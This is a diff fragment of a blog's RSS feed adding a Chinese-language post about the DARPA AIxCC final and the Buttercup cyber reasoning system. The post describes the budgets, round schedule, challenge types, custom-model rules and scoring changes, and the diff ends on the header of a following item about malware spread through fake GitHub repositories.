+        <title>AIxCC决赛启动：Buttercup引领网络安全AI新浪潮</title>
+        <link>http://localhost:1313/p/aixcc%E5%86%B3%E8%B5%9B%E5%90%AF%E5%8A%A8buttercup%E5%BC%95%E9%A2%86%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8ai%E6%96%B0%E6%B5%AA%E6%BD%AE/</link>
+        <pubDate>Sun, 03 Aug 2025 00:20:05 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/aixcc%E5%86%B3%E8%B5%9B%E5%90%AF%E5%8A%A8buttercup%E5%BC%95%E9%A2%86%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8ai%E6%96%B0%E6%B5%AA%E6%BD%AE/</guid>
+        <description>&lt;h1 id=&#34;以buttercup开启aixcc决赛征程&#34;&gt;以Buttercup开启AIxCC决赛征程
+&lt;/h1&gt;&lt;p&gt;DARPA人工智能网络挑战赛（AIxCC）决赛正式启动，我们的网络推理系统Buttercup已整装待发！这项最初限制严格的赛事现已变得更加雄心勃勃。参赛团队现在可以构建自定义AI模型、自主控制基础设施，并同时应对多种类型的安全挑战。伴随新挑战而来的是更多资源——每项挑战的预算从半决赛的100美元提升至1000美元以上。&lt;/p&gt;
+&lt;p&gt;这些改变不仅是数字上的增长，更是让参赛者能够构建更接近实用安全工具的系统，而非学术概念验证。技术方法的弹性扩展也意味着我们将看到AI在网络安全问题上更创新的应用——这些在半决赛限制下根本无法实现。&lt;/p&gt;
+&lt;h2 id=&#34;预算与时间扩展&#34;&gt;预算与时间扩展
+&lt;/h2&gt;&lt;p&gt;决赛最显著的改变是每支团队可用资源的大幅增加。半决赛中，参赛系统在严格限制下运行：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;时间&lt;/strong&gt;：每项挑战仅4小时分析时间&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;AI预算&lt;/strong&gt;：每项挑战仅100美元用于商业AI API调用（如ChatGPT、Claude）&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;计算预算&lt;/strong&gt;：固定分配的虚拟机资源，扩展选项有限&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;决赛阶段的约束条件（可能调整）现已变为：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;时间&lt;/strong&gt;：每项挑战8+小时&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;AI预算&lt;/strong&gt;：每轮10,000美元用于商业AI API调用（每轮含多项挑战）&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;计算预算&lt;/strong&gt;：每轮20,000美元用于Azure资源（服务器、VM、GPU）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;这些新增资源让我们能在更实际的时间框架内进行更彻底的分析。Buttercup现在能够：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;执行更深入的动态分析并对补丁进行更全面的测试&lt;/li&gt;
+&lt;li&gt;扩展资源密集型任务（如模糊测试）的规模&lt;/li&gt;
+&lt;li&gt;使用更多样化的商业AI模型处理更广泛的任务&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;多轮竞赛机制&#34;&gt;多轮竞赛机制
+&lt;/h2&gt;&lt;p&gt;与半决赛单轮评分不同，决赛包含三轮不计分的展示赛，让团队能在最终评分轮前迭代改进其CRS系统：&lt;/p&gt;
+&lt;table&gt;
+  &lt;thead&gt;
+      &lt;tr&gt;
+          &lt;th&gt;轮次&lt;/th&gt;
+          &lt;th&gt;开放时间&lt;/th&gt;
+          &lt;th&gt;计分&lt;/th&gt;
+          &lt;th&gt;关键参数&lt;/th&gt;
+      &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+      &lt;tr&gt;
+          &lt;td&gt;展示赛1&lt;/td&gt;
+          &lt;td&gt;4月1日&lt;/td&gt;
+          &lt;td&gt;不计分&lt;/td&gt;
+          &lt;td&gt;2万计算预算+1万AI预算，2项挑战，最多2项并发，48小时窗口（仅差异扫描挑战）&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;展示赛2&lt;/td&gt;
+          &lt;td&gt;5月6日&lt;/td&gt;
+          &lt;td&gt;不计分&lt;/td&gt;
+          &lt;td&gt;同预算，15-30项挑战，最多4项并发，8小时差异扫描/24小时全扫描窗口&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;展示赛3&lt;/td&gt;
+          &lt;td&gt;6月3日&lt;/td&gt;
+          &lt;td&gt;不计分&lt;/td&gt;
+          &lt;td&gt;参数待定（提前30天公布）&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;决赛轮&lt;/td&gt;
+          &lt;td&gt;6月24日&lt;/td&gt;
+          &lt;td&gt;计分&lt;/td&gt;
+          &lt;td&gt;参数待定（提前30天公布）&lt;/td&gt;
+      &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;&lt;em&gt;表1：决赛阶段竞赛结构&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;这种渐进式设计鼓励系统适应变化的需求——这是现实世界安全工具的关键品质。参赛者还能基于前几轮反馈迭代优化方案，使DEFCON 2025亮相的最终系统更加健壮。&lt;/p&gt;
+&lt;h2 id=&#34;多样化挑战类型&#34;&gt;多样化挑战类型
+&lt;/h2&gt;&lt;p&gt;最具技术意义的变革是引入多种挑战类型。半决赛仅有一种挑战模式——提供少于100次提交的精简git历史的真实开源软件。决赛挑战仍基于真实开源软件，但现包含：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;差异扫描挑战&lt;/strong&gt;&lt;br&gt;
+提供代码库和引入漏洞的单个diff文件。代码库包含初始模糊测试工具，diff文件则为CRS提供识别和修补漏洞的额外起点。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;全扫描挑战&lt;/strong&gt;&lt;br&gt;
+呈现已包含漏洞的扁平化代码库。没有diff文件作为起点，CRS必须仅依靠模糊测试工具对代码库进行全面分析。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;SARIF广播挑战&lt;/strong&gt;&lt;br&gt;
+提供SARIF格式的静态分析警报（可能为真阳性或假阳性）。CRS需评估警报是否代表真实漏洞，并可选择提供补丁。&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;这种多样化至关重要，因为现实漏洞可能通过代码审查、静态分析工具、模糊测试和运行时监控等多种渠道发现。能处理所有这些输入的系统在实际安全环境中将更具价值。&lt;/p&gt;
+&lt;h2 id=&#34;支持自定义ai模型开发&#34;&gt;支持自定义AI模型开发
+&lt;/h2&gt;&lt;p&gt;这项赛事政策的最大变革是DARPA现在允许使用自定义AI/ML模型。半决赛中系统仅能使用Anthropic、OpenAI和Google的第三方模型。现在参赛者可开发部署自己的专用模型（需通过竞赛审核且可复现）。&lt;/p&gt;
+&lt;p&gt;团队现在能够：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;微调专门用于安全漏洞检测的模型&lt;/li&gt;
+&lt;li&gt;为漏洞分析的不同环节创建专用模型&lt;/li&gt;
+&lt;li&gt;开发轻量级高效模型处理重复性任务&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;为确保公平竞争仍有限制：自定义模型不能预训练记忆开源软件历史漏洞信息。这防止团队简单教授模型已知问题，确保系统展示真正的推理能力。&lt;/p&gt;
+&lt;h2 id=&#34;弹性计算资源配置&#34;&gt;弹性计算资源配置
+&lt;/h2&gt;&lt;p&gt;另一重大技术转变是赋予参赛者基础设施的直接控制权。团队现在获得Azure订阅，仅受轮次计算预算约束，而非半决赛的固定计算资源分配。&lt;/p&gt;
+&lt;p&gt;这意味着团队能基于每项挑战的独特需求制定资源分配策略：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;为计算密集型模糊测试分配更强硬件&lt;/li&gt;
+&lt;li&gt;为运行自定义AI模型配置昂贵GPU实例&lt;/li&gt;
+&lt;li&gt;根据挑战复杂度动态扩展资源&lt;/li&gt;
+&lt;li&gt;并行运行多个分析管道&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;这种弹性让团队能在不计分轮次试验不同分配策略，确定哪种方案最适合各类挑战。&lt;/p&gt;
+&lt;h2 id=&#34;评分算法革新&#34;&gt;评分算法革新
+&lt;/h2&gt;&lt;p&gt;AIxCC决赛保留&amp;quot;补丁价值远高于单纯漏洞发现&amp;quot;的核心评分原则，但新增维度：&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;新增得分机会&lt;/strong&gt;：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;SARIF分类：正确标记静态分析警报的真/假阳性&lt;/li&gt;
+&lt;li&gt;捆绑提交：将SARIF广播与漏洞和补丁关联&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;新评分修正项&lt;/strong&gt;：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;早鸟奖励：越早提交得分越高&lt;/li&gt;
+&lt;li&gt;跨团队验证：补丁必须能抵御所有团队发现的崩溃输入才能得分&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;这些改变激励团队构建能快速通过不同方法发现漏洞的系统，并创建真正解决漏洞根源而非过滤特定崩溃输入的补丁。&lt;/p&gt;
+&lt;h2 id=&#34;buttercup的下一步&#34;&gt;Buttercup的下一步
+&lt;/h2&gt;&lt;p&gt;Buttercup 2.0正在参与展示赛，团队利用反馈优化方案。我们的工作将在6月下旬的决赛轮达到高潮，结果于8月DEF CON 2025公布。这项赛事诞生的系统将代表自动化漏洞发现与修复领域的重大飞跃。&lt;/p&gt;
+&lt;p&gt;敬请关注Buttercup在AIxCC决赛中的更多进展！&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;免责声明：本文涉及的AIxCC规则、评分指南、基础设施和活动信息可能变更。本文非权威文档，请以DARPA官网和官方文件为准。&lt;/em&gt;&lt;/p&gt;
+</description>
+        </item>
+        <item>
         <title>AI生成虚假GitHub仓库传播SmartLoader和LummaStealer恶意软件</title>
         <link>http://localhost:1313/p/ai%E7%94%9F%E6%88%90%E8%99%9A%E5%81%87github%E4%BB%93%E5%BA%93%E4%BC%A0%E6%92%ADsmartloader%E5%92%8Clummastealer%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/</link>
         <pubDate>Sat, 02 Aug 2025 22:33:52 +0800</pubDate>
